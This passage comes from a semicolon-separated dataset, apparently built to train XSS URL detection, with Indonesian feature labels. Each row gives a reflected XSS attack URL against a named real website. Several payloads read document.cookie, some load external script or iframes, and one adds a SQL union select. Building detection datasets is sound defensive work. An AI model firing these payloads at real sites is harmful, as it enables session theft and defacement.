properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://outlink.webkicks.de/dref.cgi?job=dref&url=http://www.google.de;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://pacoma.multiply.com/guestbook%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://pakistanstores.com/feedback.php?name=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&email=%22%2F%3E%3Cscript %3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&sub=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vija yendra%22%29%3C%2Fscript%3E&message=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscr ipt%3E&fsubmit=Submit;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://partners.rt.com/search/hotels/?q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://people.na.infn.it/~chiefari/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://people.w3.org/rishida/utils/subtags/index.php?find=%27%22%3E%3C%3Cscript%3Ealert(1)%3C/script%3E%3E&submit=Find;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://ph.msn.astroyogi.com/login_main.asp?services=>\"\">alert(/XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY/)%3B<h1>XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY</h1>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://ponsel-online.com/index.php?action=store.showProduct&product_id=;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://populus.es.msn.com/participa.aspx?nombre=\"\"</script><script>if (1){alert(1);//\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://pt.akinator.com/valide_contacte.php?sitefrom='\"\">&urlfrom='\"\">&engine='\"\">&typeMessage='\"\">&mail='\"\">&message='\"\">alert(1)\";Kurang dari 54;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://pti.regione.sicilia.it/portal/page/portal/PIR_PORTALE/PIR_LaStrutturaRegionale/PIR_Assessorat oregionaledelleRisorseAgricoleeAlimentari/PIR_DipIntStrutturali/PIR_DipIntStrutturali_News?_piref857 _7105408_857_4739684_4739684.strutsAction=/thematicNews.do&month=10&stepThematicNews=month_news&them aticFilter=%22%20%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E&year=2008;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://quazen.com/?s=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://realty.yandex.ru/search.xml?type=SELL&category=APARTMENT'%2Balert%28%22XSS%22%29%2B';Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://receptome.stanford.edu/hpmr/SearchDB/findGenes.asp?textName=%3Cscript%3Ealert%28%22zargar%20yasir%22%29%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://reg.email.163.com/mailregAll/checkreg.do?username=yes&domain=163.com&sid=lCLGlQWaIQwqPYAODAaaBLsMFDjOKwOW&uid=yes%40163.com&host=webmail.mail.163.com&ver=js4&callback=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://registration.ge/includes/custom/checkNs.php?nsServers=1%3CScRiPt%20%3Eprompt%28934165%29%3C%2fScRiPt%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://reprise-entreprise.lefigaro.fr/evaluation-entreprise.html?ca=&id_secteur_activite=&date_operation=&mots_cles=\"\">&x=40&y=12\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://researchguides.case.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://researchguides.library.wisc.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://ringtones.nl.msn.com/games.php?rtch=1&rtlo=%22%3E%3C/title%3E%3Cstyle%3Ebody{visibility:hidden;}%20html{background-color:%20Black;}%3C/style%3E%27%22%3E%3Cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%E2%80%8B%E2%80%8Bz-index:%2010;visibility:%20visible;%20color:%20White;%20font-size:%2020px;%22%3E%3Cimg%20src=%22http://img257.imageshack.us/img257/3733/77822687.png%22%20style=%22height:%20400px;%20width:%20600px;%22%20alt=%22By%20Sony%22%3E%3Cbr%3Eby%20Sony%3Ciframe%20src=%22http://insecurity.ro%22%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://robotics.research.yale.edu/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://ru.akinator.com/valide_contacte.php?sitefrom='\"\">&urlfrom='\"\">&engine='\"\">&typeMessage='\"\">&mail='\"\">&message='\"\">alert(1)\";Kurang dari 54;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://ru.espacenet.com/search97cgi/s97_cgi.exe?Action=FormGen&Template=<script>alert('E1')</script>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://saloweb.nl/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://science.mkoeppen.com/science/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://scully.cfa.harvard.edu/cgi-bin/feedback.cgi?U=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://sds.sabre.com/DataBase/SubComp.asp?mdrver=1&mdrNam=ACHPRMASQREQST%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://search.adl.org/search?q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E+Or%3A+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnG.x=12&btnG.y=16&btnG=Search&entqr=0&output=xml_no_dtd&sort=date%3AD%3AL%3Ad1&ie=UTF-8&lr=&client=adl&ud=1&site=adl&y=16&oe=UTF-8&proxystylesheet=adl&x=11;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://search.babeland.com/?Ntt=%3Cscript%3Ealert(document.domain)%3C/script%3E&N=1000030&Nty=1&sid=128363C03FAE;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://search.dilbert.com/search?w=\"\" onmouseover=\"\"alert(1);\"\" alt=\"\"&x=0&y=0\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://search.forbes.com/search/colArchiveSearch?author=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://search.gmane.org/?query=%3C/script%3E%3Cimg%20src=XSS%20onerror=alert%28String.fromCharCode%2888,83,83,69,68%29%29%20visibility=hidden%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://search.ironspeed.com/search?q=%22%3E%3Cscript%3Ealert(%22XSSed%22);%3C/script%3E&btnG.x=0&btnG.y=0&btnG=Search&restrict=AllHelp&site=c1&output=xml_no_dtd&client=c1&proxystylesheet=http%3A%2F%2Fwww.ironspeed.com%2Fsearch%2Fkbstyle.xsl\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://search.sport1.de/index.php?search=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://security.anti-abuse.com/index.php/\"\"><script>alert(1)</script>\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://seminarsuche.tuev-nord.de/index.jsp?Marke=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://servicios.aol.com/content/astrologia/horoscopo/horoscopos/widget/horoscopos.php?Fecha=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://sfdoccentral.symantec.com/admin/contact_us.php?FromName='\"\"><iframe src=//xssed.com>&FromMail=&Message=&submit=submit\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://shop.nationalgeographic.com/ngs/facet/facetGlossary.jsp?_dyncharset=UTF-8&_dynSessConf=6134326913753448789&trailSize=1&advancedSearch=true&liveResult=true&categoryId=&trail=&addFacet=19016%3A1%3ASRCH%3A%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&removeAllFacets=true&categoryFacetId=9004&trailtext=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&searchmenu=allCategories&search.x=16&search.y=17;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://shop.n-tv.de/Suche/?aExtendedSearch[priceFrom]=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://showing.com/search/videos/?s=%22%3E%3Cscript%3Ealert(%27XSSed%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://site6.way2sms.com/jsp/Settingsconfirm.jsp?mess=<script>alert(document.cookie)</script>&back=settings1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://skicircus.loop-server.com/unsubscribe.asp?m=1&email=%22%27%3E%22%27%3E%3Cscript%3Ewindow.alert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://slsweb.ocmboces.org/print.asp?p=no&id=2&ob=year%27&d=desc,7%20asc+union+select+%27%3Cscript%3Ealert%281%29%3C/script%3E%27,2,3,4,5,6,7+from+web_schools;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://smarty.incutio.com/?action=find&find=/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://solutions.liveperson.com/landing-pages/live-chat/a2?siteID=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://sonica.speedy.com.ar/resultado_busqueda.php?Tipo=1&Texto=%22%3E%3CscRipt%3Ealert%28%2FXss%2F%29%3C%2FScRIPT%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://sp.ask.com/toolbar/nascartb/nascarfx/insider.php?tb=NSC-O&trackid=%22%3E%3Cscript%3Ealert(/www.trlink.net/)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://speedtest.net/results.php?ct=dp&ria=0p&s=0';</script><script>alert(\"\"W00t...\"\")</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://sports.sportsillustrated.cnn.com/racingfront.asp?series='); alert(1);//</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://sportsillustrated.cnn.com/partners/redirects/tracking.html?http://google.com;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://static.brazzers.com/docs/ipp.php?site=%22%3E%3Ciframe%20onload=alert%28document.cookie%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://subjectguides.library.american.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://suivi.chronopost.fr/servletSuivi?langue=fr_FR&noLTList=@MaKyOtOx%0A%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://support.hostgator.com/articles/affiliates/how-long-do-i-have-to-wait-to-start-as-a-hostgator-affiliate?name=&recaptcha_challenge_field=03AHJ_VuslMQ-O4HYQQvrF0puTGo-RzMJs-xaqHm5hC-RX7V0cUi8Am0lUrZj2QeqvzU S4_YYrE18-J4KUqUDpG4ADZwlYaGDcGJjevBsR8RxYqhbIHdKI0Ib8IUeY7v7jY3iozjU3hgSpkphxEOwzzEm6gxePhdBs6Q&rec aptcha_response_field=&comment=1%3C%2Ftextarea%3E1%3CScRiPt+%3Eprompt%28961307%29%3C%2FScRiPt%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://support.lexmark.com/index?page=answers&startover=y&locale=en&userlocale=EN_US&question=%3Ciframe%20src%3Dhttp%3A%2F%2Fxssed.com%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://tag.mmosite.com/search.php?q=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E&button=+;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://tain.totalcodex.net/search/?x=0&y=0&q=%3Cscript%3E++alert%28%2FVisit%20HaxInTheBox.BlogSpot.com%20For%20More%20XSS%2F%29%3B+%3C%2Fscript%3E&for=any;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://technet.microsoft.com/tr-tr/objectforward/default(en-us).aspx?type=VideoPlayer&video=[XSSEDBY JESTER]\"\"><script>alert(document.cookie)</script> \";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript 